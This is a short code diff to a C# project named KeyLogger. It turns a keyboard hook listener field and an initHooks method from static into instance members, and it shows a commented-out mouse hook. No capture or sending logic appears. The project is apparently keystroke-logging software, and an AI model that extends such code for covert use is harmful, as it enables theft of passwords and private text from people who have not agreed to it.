@@ -18,7 +18,7 @@ namespace KeyLogger
     {
         private static Program logger;
         private System.Timers.Timer timer;
-        private static KeyboardHookListener m_KeyboardHookManager;
+        private KeyboardHookListener m_KeyboardHookManager;
        // private MouseHookListener m_MouseHookManager;
        
         [STAThread]
@@ -64,7 +64,7 @@ namespace KeyLogger
         }
 
         [STAThread]
-        private static void initHooks()
+        private void initHooks()
         {
             try
             {
